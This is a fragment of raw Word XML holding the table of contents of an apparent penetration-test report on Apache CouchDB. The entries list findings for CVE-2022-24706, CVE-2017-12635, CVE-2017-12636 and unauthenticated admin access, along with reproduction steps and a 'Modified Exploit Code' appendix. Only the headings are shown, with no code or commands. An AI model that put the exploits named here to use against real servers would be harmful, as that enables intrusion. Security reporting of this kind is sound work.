            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="660"/>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392736" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:noProof/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Testing Methodology</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392736 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="660"/>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392737" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:noProof/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools &amp; Websites Used</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392737 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</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38" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Detailed Technical Reports (Scope Limited)</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392738 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</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39" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>[example.com]</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392739 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392740" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t xml:space="preserve">Finding 1: CVE-2022-24706 (Apache CouchDB &lt; 3.2.2) – </w:t>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
                <w:highlight w:val="red"/>
              </w:rPr>
              <w:t>HIGH</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392740 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392741" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t xml:space="preserve">Finding 2: Apache CouchDB Unauthenticated Administrative Access – </w:t>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
                <w:highlight w:val="red"/>
              </w:rPr>
              <w:t>CRITICAL</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392741 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392742" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Steps to Reproduce</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392742 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392743" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t xml:space="preserve">Finding 3: CVE-2017-12635 (Apache CouchDB &lt; 1.7.0 and 2.x &lt; 2.1.1) – </w:t>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
                <w:highlight w:val="red"/>
              </w:rPr>
              <w:t>HIGH</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392743 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392744" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Steps to Reproduce</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392744 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392745" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t xml:space="preserve">Finding 4: CVE-2017-12636 (Apache CouchDB &lt; 1.7.0 and 2.x &lt; 2.1.1) – </w:t>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
                <w:highlight w:val="red"/>
              </w:rPr>
              <w:t>HIGH</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392745 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392746" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Steps to Reproduce</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392746 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</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47" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendixes</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392747 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</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48" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix A:  Vulnerability Score Analysis – CVSS 3.0</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392748 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</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49" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix B: Modified Exploit Code</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392749 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</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50" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Modified Exploit Code For CVE-2022-24706</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392750 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</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51" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Modified Exploit Code For Apache CouchDB Unauthenticated Administrative Access</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
